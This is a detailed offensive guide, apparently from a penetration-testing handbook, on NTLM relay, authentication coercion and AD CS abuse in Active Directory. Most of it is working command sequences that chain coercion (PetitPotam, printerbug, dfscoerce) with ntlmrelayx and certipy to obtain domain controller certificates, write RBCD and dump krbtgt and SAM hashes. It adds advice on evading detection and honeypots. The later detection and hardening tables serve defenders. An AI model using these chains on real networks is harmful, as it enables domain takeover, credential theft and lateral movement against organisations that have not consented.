Certipy's relay arguments changed at **4.7.0**, not at the 4-to-5 boundary, and the trap is that both flags survived with different meanings. Up to 4.6.0, `-ca` took the CA's IP address or hostname and `-target` did not exist. From 4.7.0 onward, including all of 5.x, `-target` is required and takes a scheme-qualified value, `http://ca.corp.local` for ESC8 or `rpc://ca.corp.local` for ESC11, while `-ca` now means the CA's *name*, for example `CORP-CA`, and is needed only for the RPC path. There is no separate ESC11 flag: the `rpc://` scheme selects it.

The detailed template abuse, ESC numbering, and the KB5014754 strong certificate mapping implications are covered in the AD CS domain escalation material later in this section. What matters here is that AD CS web enrolment is the highest-value HTTP relay target in AD, and that a certificate obtained via relay carries the relayed principal's own identity and SID, so it satisfies strong mapping on patched CAs.

#### MSSQL

| Item | Detail |
| --- | --- |
| Precondition | Relayed principal has a login on the instance. TDS accepts NTLM, which it does by default for Windows authentication |
| Yields | Query execution as the relayed principal. `xp_cmdshell` if the principal is sysadmin. Onward UNC path injection to coerce the SQL service account |

```bash
ntlmrelayx.py -t "mssql://$TARGET" -smb2support -q "SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')"
```

The reverse direction is also useful and is what the original notes hinted at: MSSQL is a *coercion source*. Any principal with a login can make the SQL Server service account authenticate outbound.

```sql
EXEC master..xp_dirtree '\\$ATTACKER\share';
EXEC master..xp_fileexist '\\$ATTACKER\share\x';
```

That yields the SQL service account, which is frequently a domain account with rights that a machine account would not have. Combine it with `EXEC ('...') AT LINKEDSERVER` to coerce authentication from a linked server you cannot reach directly.

#### RPC

ntlmrelayx can relay to RPC endpoints, most usefully the task scheduler interface for command execution, which sidesteps the SMB signing requirement entirely because the transport is RPC rather than SMB.

```bash
ntlmrelayx.py -t "rpc://$TARGET" -smb2support -c 'whoami'
```

Two RPC interfaces are supported, selected with `-rpc-mode`, which takes `TSCH` (the task scheduler, and the default) or `ICPR` (the AD CS certificate request interface, which is the ESC11 path). For `ICPR` you also need `-icpr-ca-name` to name the CA. `-rpc-use-smb` relays the DCE/RPC over SMB named pipes instead of over TCP, with `-rpc-smb-port` choosing 139 or 445 and `-auth-smb` plus `-hashes-smb` supplying a credential for the SMB leg, which you need because that leg is a separate authentication rather than the relayed one. The same interface choice is available on the SMB client side as `--rpc-attack {TSCH,ICPR}`. Be aware the RPC interface's own authentication level requirements may reject an unsigned relayed connection, which is what the DCOM and RPC hardening of 2021 to 2023 was for.

#### IMAP, IMAPS and SMTP

| Item | Detail |
| --- | --- |
| Precondition | Service accepts NTLM authentication, the relayed principal has a mailbox |
| Yields | Mailbox read, keyword search across mail, and the ability to send mail as the principal |

```bash
ntlmrelayx.py -t "imaps://$TARGET" -smb2support -k "password"
ntlmrelayx.py -t "smtp://$TARGET" -smb2support
```

Mostly relevant against legacy on-premises mail infrastructure. Modern Exchange and Exchange Online have NTLM disabled or EPA enforced on these endpoints. Still worth trying against appliances and third-party mail servers.

### The high-value chains, end to end

#### Chain 1: coerce a domain controller to AD CS, then domain compromise

This is the single most reliable path from one low-privileged domain user to full domain compromise in an estate running AD CS with web enrolment. It bypasses SMB signing entirely because the target is HTTP, and it bypasses password strength entirely because the principal is a machine account.

**Preconditions.**

- Any valid domain credential.
- AD CS with the Certificate Enrollment Web Service or Web Enrollment role installed and answering on HTTP, or on HTTPS without EPA.
- A working coercion method against the DC: spooler running, or MS-EFSR reachable, or the DFS Namespace service running.
- The `DomainController` or `Machine` certificate template published and permitting the DC to enrol, which is the default.

**Procedure.**

```bash
# 1. Locate the CA and confirm the enrolment endpoints
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip $DC -stdout
curl -sI "http://$CAHOST/certsrv/" | head -1        # expect 401, meaning Windows auth is live over HTTP

# 2. Start the relay, targeting the enrolment endpoint, requesting a DC certificate
certipy relay -target "http://$CAHOST" -template DomainController
#    impacket equivalent:
#    ntlmrelayx.py -t "http://$CAHOST/certsrv/certfnsh.asp" -smb2support --adcs --template DomainController

# 3. In a second terminal, coerce the DC. Try methods in order of likely success.
python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS $ATTACKER $DC
python3 dfscoerce.py -u $USER -p $PASS -d $DOMAIN $ATTACKER $DC
python3 printerbug.py "$DOMAIN/$USER:$PASS@$DC" $ATTACKER

# 4. The relay writes a PFX for the DC computer account. Use it for PKINIT.
certipy auth -pfx "dc01.pfx" -dc-ip $DC

# 5. That yields both a TGT and the DC computer account's NT hash. Use either.
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass "$DC"
#    or, with the recovered hash
nxc smb $DC -u 'DC01$' -H $NTHASH -d $DOMAIN --ntds
```

Note that step 3 relays to the CA, which must not be the same host as the DC you coerced. On a small estate where the CA is installed on a DC, coerce a *different* DC.

**Verify each stage.**

| Stage | Success indicator |
| --- | --- |
| Enumeration | `certipy find` lists a CA with `Web Enrollment: Enabled` |
| HTTP endpoint live | `curl -I` returns `401 Unauthorized` with a `WWW-Authenticate: Negotiate` or `NTLM` header |
| Coercion fired | The coercion tool returns `ERROR_BAD_NETPATH`, or the relay logs an inbound connection from the DC's IP |
| Authentication received | Relay logs `Authenticating against http://... as DOMAIN/DC01$ SUCCEED` |
| Certificate issued | A `.pfx` file written to disk and a "Got certificate with UPN/DNS" style message |
| PKINIT succeeded | `certipy auth` prints the NT hash and writes a `.ccache` |
| Domain compromise | `secretsdump` returns the `krbtgt` hash |

**Failure modes specific to this chain.** `403` from `/certsrv` with an EPA-related message means channel binding is enforced; try the HTTP endpoint instead of HTTPS. Certificate request denied means the template does not permit the requester or requires manager approval. `certipy auth` failing with a KDC error about the certificate mapping usually means the CA lacks the SID security extension and the DC enforces strong mapping.

#### Chain 2: relay to LDAP to configure RBCD and take over a computer

Use this when there is no AD CS, or when you want a specific host rather than the domain.

**Preconditions.**

- LDAP signing not required on the DC, or LDAPS reachable with channel binding not enforced.
- `MachineAccountQuota` above zero, or an existing computer account whose password you know.
- HTTP-borne coercion, which means the WebClient service is running on the victim. This is the hard precondition and the reason the whole WebDAV section exists.

**Procedure.**

```bash
# 1. Confirm LDAP posture and machine account quota
python3 LdapRelayScan.py -method BOTH -dc-ip $DC -u $USER -p $PASS
nxc ldap $DC -u $USER -p $PASS -d $DOMAIN -M maq

# 2. Confirm WebClient is running on the intended victim
nxc smb $TARGET -u $USER -p $PASS -d $DOMAIN -M webdav

# 3. Create an ADIDNS record so the WebDAV UNC path resolves in the Intranet zone
python3 dnstool.py -u "$NETBIOS\\$USER" -p "$PASS" -r evil -d $ATTACKER --action add $DC

# 4. Start the relay. Only the HTTP server is needed.
ntlmrelayx.py -t "ldaps://$DC" -smb2support --delegate-access --no-smb-server --http-port 80

# 5. Coerce the victim over HTTP using the single-label name
python3 PetitPotam.py -d $DOMAIN -u $USER -p $PASS "evil@80/x" $TARGET

# 6. The relay creates a computer account and writes RBCD onto $TARGET.
#    Note the account name and password it prints.

# 7. Request a service ticket impersonating a privileged user
getST.py -spn "cifs/$TARGET" -impersonate Administrator -dc-ip $DC "$DOMAIN/FAKE01\$:$PASS"

# 8. Use it
export KRB5CCNAME="Administrator@cifs_$TARGET@$DOMAIN.ccache"
psexec.py -k -no-pass "$TARGET"
secretsdump.py -k -no-pass "$TARGET"
```

**Verify each stage.**

| Stage | Success indicator |
| --- | --- |
| LDAP posture | LdapRelayScan reports channel binding not enforced and signing not required |
| Quota | The `maq` result is greater than zero |
| WebClient | The webdav module reports the target as WebDAV-enabled |
| DNS record | `nslookup evil.$DOMAIN $DC` returns `$ATTACKER` |
| Authentication received | Relay logs an inbound HTTP authentication as `DOMAIN/TARGET$` |
| RBCD written | Relay prints that delegation rights were granted, confirm with `bloodyAD --host $DC -d $DOMAIN -u $USER -p $PASS get object "TARGET$" --attr msDS-AllowedToActOnBehalfOfOtherIdentity` |
| Ticket obtained | `getST.py` writes a ccache without a `KDC_ERR` |
| Takeover | `psexec.py` returns a SYSTEM shell |

**Failure modes.** `strongerAuthRequired` means the DC requires signing or a TLS connection for the operation; switch to LDAPS. Channel binding failure on LDAPS means fall back to LDAP 389 if signing is not required, otherwise this chain is closed. `getST.py` returning `KDC_ERR_BADOPTION` typically means the RBCD write did not land, or the impersonated user is in Protected Users or marked sensitive and cannot be delegated, in which case pick a different privileged account.

**Alternative when `MachineAccountQuota` is zero.** Use shadow credentials against the target instead of RBCD, which needs no new computer account:

```bash
ntlmrelayx.py -t "ldaps://$DC" -smb2support --shadow-credentials --shadow-target "TARGET$"
# then authenticate with the emitted certificate
certipy auth -pfx "target.pfx" -dc-ip $DC
```

#### Chain 3: relay to SMB for secrets

The oldest chain and the one most likely to be dead. Still worth ten minutes because the payoff is immediate local administrator on multiple hosts.

**Preconditions.** At least one host not requiring SMB signing. A coerced or captured authentication from an account that is a local administrator on that host, which means a *user* account with wide local admin (helpdesk, a shared local admin group) rather than a machine account.

```bash
# 1. Build the target list from the signing sweep
nxc smb $TARGETS -u '' -p '' --gen-relay-list relay-targets.txt
wc -l relay-targets.txt

# 2. Turn off Responder's own SMB and HTTP servers so ntlmrelayx can bind
sudo sed -i 's/^SMB = On/SMB = Off/; s/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# 3. Start the relay across every target, dumping SAM on each success
ntlmrelayx.py -tf relay-targets.txt -smb2support -l ./loot

# 4. Start Responder for name resolution poisoning to feed it
sudo responder -I $IFACE -w

# 5. Or coerce a specific host to feed it deterministically
python3 printerbug.py "$DOMAIN/$USER:$PASS@$TARGET" $ATTACKER
```

**Verify it worked.** ntlmrelayx prints `Authenticating against smb://... SUCCEED`, then `Target system bootKey`, then the SAM hashes. Loot lands in the directory given to `-l`. Test a recovered local administrator hash for reuse:

```bash
nxc smb $TARGETS -u Administrator -H $NTHASH --local-auth
```

**Failure modes.** `SMB signing is required` on every target means this chain is over; go back to the matrix. `STATUS_ACCESS_DENIED` after a successful authentication means the relayed principal is not a local administrator on that target. `STATUS_LOGON_FAILURE` means the account or domain is wrong, commonly a local account being relayed to a domain-joined host.

### Setting up the listener properly

The relay listener is a set of rogue servers plus a target list plus an action. Getting the binding right is most of the operational difficulty.

```bash
ntlmrelayx.py \
  -tf relay-targets.txt \        # target list, one URI per line, or -t for a single target
  -smb2support \                 # accept SMB2 and SMB3 clients, effectively mandatory
  -socks \                       # keep sessions alive and expose them via SOCKS on 1080
  -l ./loot \                    # loot directory
  -of ./hashes \                 # write captured NetNTLM hashes to a file as well as relaying
  -ts \                          # timestamp every log line
  --no-smb-server \              # free port 445 for Responder or another tool
  --http-port 80 \               # HTTP rogue server port, must match your coercion UNC path
  -wh wpad.$DOMAIN               # serve a WPAD file, for use with mitm6 or DNS poisoning
```

Key points:

- **Target URI scheme is mandatory and meaningful.** `smb://host`, `ldap://host`, `ldaps://host`, `http://host/path`, `https://host/path`, `mssql://host`, `imap://host`, `rpc://host`. Omitting the scheme defaults to SMB and will silently do the wrong thing.
- **The target list can be reloaded live** with `-w`, which watches the file for changes. Useful when you are still enumerating while the relay runs.
- **Interface binding.** ntlmrelayx binds all interfaces by default. On a multi-homed host or a pivot, that matters; check with `ss -tlnp` after starting.
- **One action per relay run.** Decide in advance whether you are dumping, executing, or writing to the directory. Switching mid-run means restarting and re-coercing.
- **`-c` versus `-e`.** `-c` runs a command string through service creation, `-e` uploads and runs a binary. `-c` is quieter and leaves less on disk.

**Reading the output.** The lines that matter, in order:

| Log line | Meaning |
| --- | --- |
| `SMBD-Thread-N: Connection from DOMAIN/USER@IP controlled, attacking target ...` | An authentication arrived and the relay is forwarding it |
| `Authenticating against <target> as DOMAIN/USER SUCCEED` | The relayed authentication was accepted by the target |
| `Authenticating against <target> as DOMAIN/USER FAILED` | Credential accepted nowhere, or the target rejected the relayed session |
| `Signing is required, aborting` | The target requires signing. Remove it from the list |
| `The client requested signing. Relaying to LDAP will not work!` | Source protocol was SMB. You need HTTP-borne authentication |
| `SMBCLIENT: Error ... STATUS_ACCESS_DENIED` | Authenticated fine, no rights on the target |
| `Enumerating relayed user's privileges` then an ACL write | LDAP relay landed and is acting |
| `Skipping user DOMAIN/USER since attack was already performed` | Deduplication. Restart or use `--no-multirelay` handling to retry |

An authentication that arrives and produces no further lines usually means the target list was empty or every target was already attacked for that user.

#### Port conflicts with Responder

This catches everyone. Responder and ntlmrelayx both want to bind 445 and 80. Whichever starts first wins and the other fails, often with a bind error buried in the output.

The rule: **the tool that receives the authentication needs the port.** If you are relaying, ntlmrelayx needs 445 and 80, so Responder's own servers must be turned off. Responder is still valuable for the poisoning itself, which is unrelated to those ports.

```bash
# Turn off Responder's SMB and HTTP servers in its config
sudo sed -i 's/^SMB = On/SMB = Off/; s/^HTTP = On/HTTP = Off/' /etc/responder/Responder.conf

# Verify
grep -E '^(SMB|HTTP) =' /etc/responder/Responder.conf

# Confirm who owns the ports after starting both
sudo ss -tlnp | grep -E ':(80|445|389|636|1080)\b'
```

The config path differs by packaging: `/etc/responder/Responder.conf` on current Kali, `/usr/share/responder/Responder.conf` on older installs and source checkouts. Check both.

The reverse case also exists: if you only want to *capture* hashes, leave Responder's servers on and do not run ntlmrelayx at all. Running both with overlapping ports produces the confusing symptom of coercion apparently working while the relay sees nothing, because Responder answered and captured instead.

Also mind that a system SMB service (`smbd`) will hold 445 and must be stopped, and that binding below 1024 requires root.

#### Multi-relay and session management

**Holding sessions open.** By default ntlmrelayx performs its action and closes the session. With `-socks`, it instead keeps every established session alive with periodic keepalives and registers it in an internal table. This is a substantial capability change: one coerced authentication becomes a durable foothold you can use with arbitrary tooling.

```bash
ntlmrelayx.py -tf relay-targets.txt -smb2support -socks
```

At the interactive prompt:

```text
ntlmrelayx> socks
Protocol  Target          Username              AdminStatus  Port
--------  --------------  --------------------  -----------  ----
SMB       10.0.0.20       CORP/HELPDESK         TRUE         1080
MSSQL     10.0.0.31       CORP/SVC_SQL          N/A          1080
```

The `AdminStatus` column is the thing to read: `TRUE` means the relayed principal is a local administrator on that target, so privileged actions will work.

**Using a relayed session with other tooling.** The SOCKS proxy listens on 1080 and multiplexes by target. Configure proxychains and then use any tool that speaks the relayed protocol, supplying the username with an empty or arbitrary password since the proxy substitutes the live session.

```bash
echo "socks4 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf

proxychains4 -q secretsdump.py "CORP/HELPDESK@10.0.0.20" -no-pass
proxychains4 -q smbclient.py "CORP/HELPDESK@10.0.0.20" -no-pass
proxychains4 -q nxc smb 10.0.0.20 -u HELPDESK -p '' -d CORP
proxychains4 -q mssqlclient.py "CORP/SVC_SQL@10.0.0.31" -no-pass -windows-auth
```

This is also how the MSSQL UNC-path-injection scenario in the original notes fits together: the relay holds a session, proxychains routes your SQL client through it.

**Relaying one authentication to multiple targets.** ntlmrelayx tracks which (user, target) pairs it has already attacked and skips repeats, which is why a second coercion of the same host appears to do nothing. With a multi-entry target file it will attack a given user against each target in turn as new authentications arrive, so the practical pattern is: large target list, then coerce repeatedly. Each coercion consumes one target for that principal.

Because one authentication is one relayed session, a single coercion cannot be fanned out to many targets. Coerce N times to hit N targets. Coercion methods are cheap to repeat, so loop:

```bash
for i in $(seq 1 20); do python3 printerbug.py "$DOMAIN/$USER:$PASS@$TARGET" $ATTACKER; sleep 2; done
```

Two flags control this. Multi-host relay across the SMB and HTTP servers is **on by default** and `--no-multirelay` disables it, so the default is already the behaviour you want. `--keep-relaying` is the one people are usually reaching for: it keeps relaying to a target even after a successful connection to it, which turns the one-attack-per-pair rule off for that target. `-ra`/`--random` randomises target selection, which helps when a target list contains hosts that will reject you and you do not want to burn coercions in list order.

### Kerberos relay

**What it is.** The same forwarding attack against Kerberos rather than NTLM: intercept a client's AP-REQ and present it to a different service.

**Why it is much harder.** A Kerberos service ticket is encrypted with the long-term key of the account the SPN maps to. You cannot retarget a ticket for `cifs/FILE01` at `ldap/DC01`, because DC01's computer account cannot decrypt a ticket encrypted with FILE01's key. So the freedom that makes NTLM relay so powerful does not exist.

**What is actually possible.** Two structural facts create room:

- All host-based SPNs on a given machine map to that machine's computer account and therefore to a single key. A ticket for `cifs/HOST` and a ticket for `ldap/HOST` are encrypted with the same key. Whether the target service rejects a ticket whose SPN names a different service class depends on the service, and many do not check the service class portion.
- The SPN a client requests is derived from the name it was told to connect to. If you control name resolution, you influence which SPN is requested. This is the lever: coerce a client to connect to a name that maps to the victim computer account, then relay the resulting AP-REQ to a different service on that same machine.

That makes Kerberos relay predominantly a **same-host, cross-service** technique, which in practice means local privilege escalation rather than lateral movement. The well-documented instance is relaying Kerberos authentication to LDAP on a domain controller to configure RBCD on the local machine account, escalating a domain user to SYSTEM on their own workstation. Tooling in this space includes `KrbRelay` and `KrbRelayUp`.

**What still blocks it.** Everything that blocks NTLM relay on the basis of session keys also blocks Kerberos relay, because the sub-session key is inside the encrypted ticket and the relay cannot read it. So signing and channel binding are equally effective. What Kerberos relay *does* bypass is NTLM being disabled, which makes it the residual technique in estates that have removed NTLM but not deployed signing and channel binding.

Cross-host Kerberos relay requires making the victim request a ticket for an SPN that resolves to the target's account, which needs either write access to add an SPN or a DNS name under your control mapped to the target account.

Two things here genuinely move faster than any written reference can track: which services enforce the service-class portion of the SPN, and whether the current build of `KrbRelay` or `KrbRelayUp` still works against a given patch level. Both have been repeatedly narrowed by DCOM and RPC authentication-level hardening and by LDAP signing and channel binding defaults. Test the primitive in the target estate rather than reasoning from a write-up, and treat a tool that fails as evidence about that estate's patch level rather than as evidence the technique is dead.

### Failure diagnosis

| Symptom or error | Meaning | Action |
| --- | --- | --- |
| `SMB signing is required, aborting` | Target requires SMB signing | Remove from target list. Regenerate the list with `--gen-relay-list` |
| `The client requested signing. Relaying to LDAP will not work!` | Source was SMB, which always requests signing, and the MIC prevents stripping it | Switch to HTTP-borne coercion via WebDAV |
| `strongerAuthRequired` from LDAP | The DC requires signing or a confidential connection for this operation | Use LDAPS. If channel binding is also enforced, this path is closed |
| LDAPS bind fails immediately after a successful NTLM authentication | Channel binding enforced; your TLS certificate does not match the CBT the client computed | Fall back to LDAP 389 if signing is not required |
| `403` from an HTTPS endpoint after authentication | EPA enforced on the IIS site | Try the plain HTTP endpoint. If HTTP is disabled, closed |
| `STATUS_ACCESS_DENIED` after `Authenticating ... SUCCEED` | The relay worked; the relayed principal simply has no rights on that target | Wrong principal. Machine accounts are not admins on other hosts. Pick a target where the principal has rights, or coerce a different account |
| `STATUS_LOGON_FAILURE` on the relayed target | The account or domain does not exist at the target, commonly a local account relayed to a domain host | Check the domain field in the inbound authentication |
| `Authenticating ... FAILED` with no further detail | Reflection protection, target name validation, or a MIC mismatch | Confirm the target host is not the source host. Check `SmbServerNameHardeningLevel` |
| Coercion returns `ERROR_BAD_NETPATH` but nothing arrives at the listener | Coercion fired; the callback was blocked in transit | Check host firewall on the victim, egress filtering, and that you are listening on the right interface and port |
| Coercion returns `rpc_s_access_denied` | Interface filtered, patched, or you lack the privilege for that method | Try another method and another named pipe. Use `Coercer scan` to find one that responds |
| Coercion returns `RPC_S_SERVER_UNAVAILABLE` or the pipe is not found | The relevant service is stopped, for example Print Spooler | Try a different family. DFS Namespace and MS-EFSR survive spooler removal |
| HTTP coercion produces a connection with no `Authorization` header | The UNC hostname landed in the Internet zone, or WebClient is not running | Use a single-label name via ADIDNS or NBT-NS, and confirm WebClient with the webdav module |
| Nothing at all arrives, no connection, no error | Wrong port in the coercion UNC path, listener bound to the wrong interface, or `smbd` holding 445 | `ss -tlnp` and match the port to the coercion argument |
| `Skipping user ... since attack was already performed` | Deduplication against that (user, target) pair | Add more targets or restart the relay |
| Everything works and then the session dies within seconds | The target negotiated signing after all, or the action completed and closed the session | Use `-socks` to hold sessions open |
| `KDC_ERR_BADOPTION` on `getST.py` after an RBCD write | The RBCD attribute did not land, or the impersonated user is in Protected Users or flagged sensitive | Verify the attribute with `bloodyAD`, then choose a different impersonation target |

### Detection and defences

#### What this looks like in logs

| Artefact | Where | What it shows |
| --- | --- | --- |
| Event 4624, logon type 3, package NTLM | The relay target | A successful network logon. The give-away is a **computer account authenticating from an IP that is not its own** |
| Event 4625 | The relay target | Failed relay attempts, in bulk when iterating a target list |
| Event 4776 | Domain controllers | NTLM credential validation, with the workstation name field carrying whatever the relay claimed |
| Event 5145 | The coerced host | Detailed file share access naming the pipe: `spoolss`, `lsarpc`, `efsrpc`, `netdfs`, `eventlog`. This is the single best coercion detection |
| Event 5140 | The coerced host | Access to the `IPC$` share preceding the pipe access |
| Sysmon Event ID 3 | The coerced host | Outbound network connection from `spoolsv.exe` or `lsass.exe` to an unexpected host on 445 or 80 |
| Sysmon Event ID 18 | The coerced host | Named pipe connection to the coercion pipes |
| Directory Service events 2886 to 2889 | Domain controllers | Unsigned or cleartext LDAP binds, with 2889 naming the client IP and account |
| Directory Service events 3039, 3074 and 3075 | Domain controllers | Channel binding, and the three states are distinct. **3039** is an actual validation failure. **3074** is "would have failed if enforcement were on", the audit-only case for a malformed token. **3075** is a capable client that sent no token at all, which is the relay signature. 3040 and 3041 are the 24-hour summary and the nag warning |
| `Microsoft-Windows-NTLM/Operational` | Clients and servers | NTLM usage auditing when Restrict NTLM is set to audit mode |
| AD CS Event 4886 and 4887 | The CA | Certificate request received and issued, with the requester identity. A DC computer account requesting a certificate from an unusual source IP is the ESC8 signature |

Managed detection products have specific signatures for this class: relay attempts, NTLM authentication tampering matching the drop-the-MIC pattern, and anomalous machine-account network logons. Assume a domain with Defender for Identity sensors on its DCs will alert on a DC coercion within minutes.

#### Quieter choices

- Use `Coercer scan` rather than `coerce --always-continue`, so you make one RPC call instead of dozens.
- Prefer file-based coercion when you have time: it generates no inbound RPC at all and the authentication looks like a user browsing a share.
- Prefer `-c` over `-e` when relaying to SMB, to avoid writing a binary to `ADMIN$`.
- Relay to LDAP for a single targeted ACL write rather than running `--dump-laps --dump-gmsa --dump-adcs`, which produces a large and distinctive LDAP query burst.
- Do not point a relay at a target list of hundreds of hosts unless you accept a wave of 4625 events across the estate.
- Clean up: remove ADIDNS records, remove the computer account created by `--delegate-access`, clear the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute you wrote, and delete file-based coercion payloads from shares.

#### Honeypot and canary detection

Defenders detect this cheaply and you should assume it:

- A monitored decoy account whose credentials are seeded where an attacker would find them, alerting on any use.
- A host that queries a random non-existent name and alerts if anything answers, which catches LLMNR, NBT-NS, mDNS and ADIDNS wildcard poisoning immediately.
- A monitored SMB listener that alerts on any inbound authentication, which catches coercion pointed at the wrong address and coercion sweeps.
- Alerting on the creation of computer accounts by non-administrative principals, which catches `--delegate-access` and `--add-computer`.
- Alerting on writes to `msDS-AllowedToActOnBehalfOfOtherIdentity` and `msDS-KeyCredentialLink`, both of which are near-zero-baseline attributes in most estates.

#### The controls that shut this down

| Control | Effect | How to check before you commit |
| --- | --- | --- |
| SMB signing required, client and server, fleet-wide | Kills all SMB relay | `nxc smb $TARGETS --gen-relay-list`, empty output means closed |
| LDAP signing required (`LDAPServerIntegrity = 2`) | Kills LDAP 389 relay | `LdapRelayScan`, or the `ldap-checker` module |
| LDAP channel binding enforced | Kills LDAPS relay | Same tools |
| EPA required on IIS sites, and HTTP bindings removed | Kills HTTP relay including ESC8 | `curl -I` the HTTP endpoint; a connection refused means HTTP is gone |
| `IF_ENFORCEENCRYPTICERTREQUEST` set on the CA | Kills ESC11 RPC enrolment relay | `certipy find` reports the CA's request flags |
| WebClient service disabled or removed | Removes the ability to force HTTP-borne authentication, closing the LDAP path from RPC coercion | `nxc smb $TARGETS -M webdav` returning nothing across the estate |
| Print Spooler stopped on servers | Removes MS-RPRN coercion | `nxc smb $TARGETS -M spooler` |
| RPC filtering on the coercion interfaces | Removes RPC coercion generally | `Coercer scan` returning access denied on every method |
| Restrict NTLM outbound on clients | Removes coercion at source | Registry check for `RestrictSendingNTLMTraffic`, or NTLM operational log |
| SMB client NTLM blocking on Windows 11 24H2 and later | Coercion to SMB fails on modern clients regardless of method | `Get-SmbClientConfiguration` shows `BlockNTLM` |
| LLMNR, NBT-NS and mDNS disabled | Removes passive poisoning | Send a query for a random name and see if the client falls back |
| Account tiering, so privileged accounts never authenticate to arbitrary hosts | Removes the value of a captured or relayed user authentication | BloodHound: check whether tier-0 accounts have sessions on workstations |
| Protected Users, and accounts marked sensitive and not delegated | Blocks the impersonation step of the RBCD chains | LDAP query for `userAccountControl` bit `NOT_DELEGATED` and Protected Users membership |

**How to sequence the pre-flight so you do not burn the attack.** Run the read-only checks in this order and stop as soon as you have a live path: SMB signing sweep, LDAP signing and channel binding check, AD CS enrolment endpoint check over HTTP, WebClient sweep, spooler sweep, `Coercer scan` against a single non-critical host. All six are low-noise and none of them coerce anything. Only then choose a chain and fire it once, with the relay already running and verified as bound to the right ports. Coercing a domain controller before the listener is up is the most common self-inflicted failure in this entire attack class.


## AD CS domain escalation

Active Directory Certificate Services is the highest-yield misconfiguration surface in a modern domain. The whole attack class collapses into one sentence: **a certificate with an extended key usage that permits client authentication is an authentication credential, and the identity the KDC binds that certificate to is taken from fields inside the certificate. If you can influence which identity ends up in a certificate, you can authenticate as anyone.**

Everything below is a variation on that. Sixteen numbered techniques exist because there are sixteen distinct ways to influence the identity in an issued certificate, or to be issued a certificate you should not be issued: the template lets you name your own subject, the template's ACL lets you make it do so, the CA lets you name your own subject regardless of template, you hold CA management rights and can approve your own denied request, you can strip the field the KDC uses to bind the certificate to a real account, or you can relay someone else's authentication into the enrolment interface and let the CA issue in their name.

Three properties make this so much worse than an ordinary ACL abuse. Certificates are valid for the template's validity period, typically one or two years, and a password reset does not invalidate them, so a single successful enrolment is long-lived access. The final step converts a certificate into a Kerberos TGT and then into an NT hash, so the yield is a credential usable everywhere, not just a certificate usable on TLS endpoints. And the misconfigurations are almost always the product of ordinary IT work rather than attacker action, so they sit in estates for years unnoticed.

Certificate theft from a compromised host, CA key theft and forgery, and the DPERSIST persistence family are covered in the certificate theft and persistence material later in this section. Authentication coercion and NTLM relay mechanics, which ESC8 and ESC11 depend on, are covered in the coercion and relay material earlier in this section. What follows is enumeration and the escalation taxonomy.

Local placeholders used throughout, in addition to the standard set: `$CA` is the CA common name as it appears in AD, for example `CORP-CA`, `$CAHOST` is the FQDN of the host running the CA service, `$TEMPLATE` is a certificate template name, and `$VICTIMPASS` is the password of a second, unprivileged account you control that is used as the victim in the ESC9 and ESC10 walkthroughs.

### Components and vocabulary

#### Where the PKI lives in Active Directory

An enterprise CA is not a standalone service. It publishes itself into the configuration partition, which is replicated to every domain controller in the forest, and that is why enumeration is entirely an LDAP problem and needs no contact with the CA at all. Everything lives under `CN=Public Key Services,CN=Services,CN=Configuration,DC=$DOMAIN`.

| Container | Object class | What it holds |
| --- | --- | --- |
| `CN=Enrollment Services` | `pKIEnrollmentService` | One object per enterprise CA. `dNSHostName` gives you the host, `cACertificate` the CA certificate, `certificateTemplates` the list of templates that CA will actually issue |
| `CN=Certificate Templates` | `pKICertificateTemplate` | Every template in the forest, published or not, each with its own ACL |
| `CN=Certification Authorities` | `certificationAuthority` | Root CAs pushed into every machine's Trusted Root store |
| `CN=NTAuthCertificates` | `certificationAuthority` | The CAs whose certificates domain controllers will accept for domain authentication. A certificate that does not chain to something in here cannot be used for PKINIT |
| `CN=AIA`, `CN=CDP` | various | Authority information access and CRL distribution points |
| `CN=OID` | `msPKI-Enterprise-Oid` | Issuance policy objects, including the group links abused by ESC13 |
| `CN=KRA` | `msPKI-PrivateKeyRecoveryAgent` | Key recovery agents |

The distinction between `CN=Certificate Templates` and a CA's `certificateTemplates` attribute is the single most common source of false positives. A template can exist in the forest, be perfectly vulnerable, and be issued by nobody because no CA has it published. Finding the template is a finding. Finding a CA that publishes it and that you have enrolment rights on is an exploit.

#### Templates as AD objects

A certificate template is an AD object with attributes and an ACL. The attributes that decide whether it is exploitable:

| Attribute | Meaning |
| --- | --- |
| `msPKI-Certificate-Name-Flag` | How the subject is built. `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` (`0x1`) means the requester dictates the subject and SAN. `CT_FLAG_SUBJECT_ALT_REQUIRE_UPN` (`0x1000000`) and `CT_FLAG_SUBJECT_ALT_REQUIRE_DNS` (`0x8000000`) mean the CA builds it from the directory instead |
| `msPKI-Enrollment-Flag` | `CT_FLAG_PEND_ALL_REQUESTS` (`0x2`) is manager approval. `CT_FLAG_NO_SECURITY_EXTENSION` (`0x80000`) suppresses the SID extension and is the ESC9 condition |
| `msPKI-RA-Signature` | Number of authorised signatures required on a request. `0` or absent means anyone who can enrol can request unaided. `1` combined with a Certificate Request Agent application policy is the enrolment agent case |
| `msPKI-RA-Application-Policies` | Which application policy the required signature must carry |
| `pKIExtendedKeyUsage` and `msPKI-Certificate-Application-Policy` | The EKU set. Empty, or containing Any Purpose, is the ESC2 condition |
| `msPKI-Certificate-Policy` | Issuance policy OIDs, the ESC13 hook |
| `msPKI-Template-Schema-Version` | Schema version. Version 1 templates behave differently on application policies, which is ESC15 |
| `msPKI-Private-Key-Flag` | Key archival, exportability, attestation requirements |
| `pKIExpirationPeriod` | How long your stolen identity lasts |
| `nTSecurityDescriptor` | The ACL. Enrolment rights live here, and so does the write access that makes ESC4 possible |

#### Enrolment rights versus object permissions

Two different kinds of permission are frequently conflated, and getting them straight is the difference between reading `certipy find` output correctly and guessing.

**Enrolment rights** are extended rights in the template's ACL: `Certificate-Enrollment` (`0e10c968-78fb-11d2-90d4-00c04f79dc55`) and `Certificate-AutoEnrollment` (`a05b8cc2-17bc-4802-a710-e7c15ab866a2`). They authorise you to ask for a certificate of this type. `Domain Users`, `Authenticated Users` or `Domain Computers` holding `Certificate-Enrollment` on a template that is otherwise vulnerable is the classic finding. The CA's own `pKIEnrollmentService` object also carries an enrolment right, so both the template and the CA must permit you.

